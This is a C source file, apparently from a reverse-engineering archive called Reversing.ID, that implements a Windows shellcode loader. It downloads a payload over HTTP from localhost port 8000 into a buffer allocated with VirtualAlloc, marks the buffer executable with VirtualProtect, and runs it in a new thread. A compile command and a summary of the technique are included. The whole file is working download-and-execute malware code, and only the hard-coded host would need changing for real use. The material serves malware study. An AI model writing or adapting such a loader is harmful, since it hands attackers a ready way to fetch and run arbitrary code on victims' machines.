/*
    Shellcode Loader
    Archive of Reversing.ID

    Download shellcode over HTTP.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  CreateThread

Note:
    - shellcode array is served in localhost
    - synchronous (GET 127.0.0.1:8000/shellcode.bin)
*/

#include <windows.h>
#include <stdint.h>
#include <winhttp.h>

#pragma comment(lib,"winhttp")


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  h_thread;
    DWORD   old_protect = 0;

    DWORD       nread;
    uint32_t    payload_len = 4096;

    wchar_t     host[]  = L"127.0.0.1";
    uint16_t    port    = 8000;
    wchar_t     path[]  = L"/shellcode.bin";

    HINTERNET   session;
    HINTERNET   conn;
    HINTERNET   reqfile;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // download the shellcode 
    // -- create session using default setting
    session = WinHttpOpen(L"ReversingID", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    // -- create connection to localhost
    conn = WinHttpConnect (session, host, port, 0);

    // -- create request
    reqfile = WinHttpOpenRequest (conn, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

    // -- send request and read response
    WinHttpSendRequest (reqfile, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    WinHttpReceiveResponse (reqfile, NULL);
    WinHttpReadData (reqfile, runtime, payload_len, &nread);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);

    if (retval != 0)
    {
        h_thread = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (h_thread, -1);
    }

    // close all handle
    WinHttpCloseHandle (reqfile);
    WinHttpCloseHandle (conn);    
    WinHttpCloseHandle (session);

    // deallocate
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}